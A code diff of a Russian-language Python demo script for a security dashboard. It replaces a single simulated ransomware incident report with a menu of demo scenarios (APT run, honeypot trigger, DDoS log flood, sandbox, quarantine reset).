+        print(" Выберите демонстрационный сценарий:")
+        print()
+        print_color("  [1] Экспресс-презентация (Быстрый прогон APT-атаки)", "green")
+        print_color("  [2] Пошаговая APT-атака (по фазам с паузами)", "yellow")
+        print_color("  [3] Срабатывание Ханипота (Атака на приманку шлюза платежей)", "cyan")
+        print_color("  [4] DDoS-нагрузка (Лавина сетевых логов и скачок графиков)", "purple")
+        print_color("  [5] Интерактивная песочница хакера (Ручное управление атакой)", "blue")
+        print_color("  [6] Сбросить карантин (Разблокировать все IP-адреса)", "red")
+        print("  [0] Выход")
+        print()
         
-    api_request('/api/incidents', {
-        'severity': 'CRITICAL', 'monitor': 'monitor_system', 'type': 'Ransomware Activity Detected',
-        'description': 'Massive file encryption in progress. CPU spiked to 100%. Ransom note dropped in /root/README.txt'
-    })
-    
-    print_color("\n [☠️] ATTACK SIMULATION COMPLETE. SERVER IS NUKED.", "red")
-    print_color(" Check the Mistral Client Dashboard to see the damage.", "yellow")
-    print("\n="*60)
-    print(" [✅] Демонстрационная атака завершена!")
-    print(" Теперь вы можете нажать кнопку [🧠 АНАЛИЗ ИИ] в Telegram.")
-    print("="*60)
-    print("\n Нажмите ENTER, чтобы закрыть окно...")
-    input()
+        choice = input(" Введите номер сценария > ").strip()
+        
+        if choice == '1':
+            run_apt_attack(step_by_step=False)
+        elif choice == '2':
+            run_apt_attack(step_by_step=True)
+        elif choice == '3':
+            run_honeypot_demo()
+        elif choice == '4':
+            run_ddos_flood()
+        elif choice == '5':
+            run_interactive_sandbox()
+        elif choice == '6':
+            clear_all_quarantine()
+        elif choice == '0':
+            print("\n Выход из симулятора.")
+            break
+        else:
+            print_color(" Неверный выбор. Пожалуйста, введите 0-6.", "red")
+            time.sleep(1.5)
 
 if __name__ == '__main__':
     main()
